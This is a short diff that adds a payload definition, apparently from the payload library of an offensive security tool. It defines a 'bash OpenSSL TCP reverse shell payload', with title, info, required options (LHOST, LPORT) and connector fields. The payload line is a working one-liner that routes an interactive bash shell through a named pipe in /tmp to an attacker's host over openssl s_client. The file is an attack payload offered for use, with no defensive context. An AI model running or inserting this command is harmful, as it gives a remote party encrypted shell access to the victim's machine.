@@ -1,0 +1,5 @@
+title=bash OpenSSL TCP reverse shell payload
+info=bash command to spawn a SSL encrypted reverse shell. No special opts required.
+required_opts=LHOST;LPORT
+connector=reverse_tcp_openssl
+payload=mkfifo /tmp/RNDSTR; /bin/bash -i 2>&1 < /tmp/RNDSTR | openssl s_client -quiet -connect LHOST:LPORT > /tmp/RNDSTR; rm /tmp/RNDSTR
